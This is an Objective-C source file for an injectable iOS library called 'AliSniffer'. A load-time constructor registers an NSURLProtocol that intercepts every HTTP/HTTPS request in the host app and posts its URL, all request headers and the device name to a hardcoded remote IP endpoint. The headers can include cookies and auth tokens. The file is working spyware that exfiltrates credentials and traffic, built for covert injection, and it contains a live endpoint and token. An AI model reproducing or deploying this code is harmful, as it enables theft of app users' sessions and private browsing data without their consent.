
//
// AliSniffer_min_safe.m
// Minimal, very-safe sniffing: **no swizzling**, only registers a lightweight NSURLProtocol to observe HTTP/HTTPS requests.
// Designed to minimize crash risk during injection. Does NOT touch WKWebView, AVPlayer, or method swizzling.
// It simply registers a protocol class and uploads any observed URL to your log endpoint.
// Change kLogUploadEndpoint / kLogUploadToken before use.
//
// This version aims to rule out whether crashes are caused by swizzling or other risky operations.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#define LOG(...) NSLog(__VA_ARGS__)

static NSString * const kLogUploadEndpoint = @"http://139.155.57.242:8088/api/push_raw";
static NSString * const kLogUploadToken    = @"@Yy166431";

static void UploadLogLineAsync(NSString *note, NSString *url, NSDictionary *headers) {
    if (!url) url = @"";
    NSMutableDictionary *payload = [NSMutableDictionary dictionary];
    payload[@"note"] = note ?: @"";
    payload[@"url"] = url ?: @"";
    payload[@"time"] = @([[NSDate date] timeIntervalSince1970]);
    if (headers && headers.count) payload[@"headers"] = headers;
    payload[@"device"] = @{ @"name": UIDevice.currentDevice.name ?: @"", @"sys": UIDevice.currentDevice.systemVersion ?: @"" };
    NSData *d = nil;
    @try { d = [NSJSONSerialization dataWithJSONObject:payload options:0 error:NULL]; } @catch(...) { d = nil; }
    if (!d) return;
    NSURL *u = [NSURL URLWithString:kLogUploadEndpoint];
    if (!u) return;
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:u];
    req.HTTPMethod = @"POST";
    [req setValue:kLogUploadToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    req.HTTPBody = d;
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    cfg.timeoutIntervalForRequest = 8.0;
    NSURLSession *s = [NSURLSession sessionWithConfiguration:cfg];
    NSURLSessionDataTask *t = [s dataTaskWithRequest:req completionHandler:^(__unused NSData * _Nullable data, __unused NSURLResponse * _Nullable resp, NSError * _Nullable err) {
        if (err) LOG(@"[AliSniffer][UPLOAD] err: %@", err);
    }];
    [t resume];
}

static void DebugReportAndUpload(NSString *url, NSDictionary *hdrs, NSString *note) {
    if (!url) url = @"";
    @try { LOG(@"[AliSniffer][MIN] %@ -> %@", note ?: @"note", url); } @catch(...) {}
    UploadLogLineAsync(note ?: @"min", url, hdrs ?: @{});
}

// Minimal NSURLProtocol that simply observes requests and lets them proceed.
@interface _MinObserveProto : NSURLProtocol <NSURLSessionDataDelegate>
@property(nonatomic,strong) NSURLSessionDataTask *task;
@end

@implementation _MinObserveProto
+ (BOOL)canInitWithRequest:(NSURLRequest *)request {
    @try {
        if (!request || !request.URL) return NO;
        if ([NSURLProtocol propertyForKey:@"_alisniffer_min" inRequest:request]) return NO;
        NSString *scheme = request.URL.scheme.lowercaseString ?: @"";
        if ([scheme isEqualToString:@"http"] || [scheme isEqualToString:@"https"]) return YES;
    } @catch(...) {}
    return NO;
}
+ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)request { return request; }

- (void)startLoading {
    NSMutableURLRequest *r = [self.request mutableCopy];
    @try { [NSURLProtocol setProperty:@YES forKey:@"_alisniffer_min" inRequest:r]; } @catch(...) {}
    @try { DebugReportAndUpload(r.URL.absoluteString, r.allHTTPHeaderFields ?: @{}, @"min_proto"); } @catch(...) {}
    // Perform the real request with default session and stream results back to client.
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *s = [NSURLSession sessionWithConfiguration:cfg delegate:self delegateQueue:nil];
    self.task = [s dataTaskWithRequest:r];
    [self.task resume];
}

- (void)stopLoading {
    @try { [self.task cancel]; } @catch(...) {}
    self.task = nil;
}

- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveData:(NSData *)data {
    @try { [self.client URLProtocol:self didLoadData:data]; } @catch(...) {}
}

- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
    if (error) {
        @try { [self.client URLProtocol:self didFailWithError:error]; } @catch(...) {}
    } else {
        @try { [self.client URLProtocolDidFinishLoading:self]; } @catch(...) {}
    }
}
@end

// Constructor: register the minimal protocol safely.
__attribute__((constructor))
static void _alisniffer_min_init(void) {
    @autoreleasepool {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try {
                [NSURLProtocol registerClass:[_MinObserveProto class]];
                LOG(@"[AliSniffer][MIN] registered minimal protocol");
                // upload a heartbeat so you can confirm endpoint is reachable
                UploadLogLineAsync(@"init", @"alisniffer_min_loaded", @{@"note":@"init"});
            } @catch (NSException *e) {
                LOG(@"[AliSniffer][MIN] register failed: %@", e);
            }
        });
    }
}
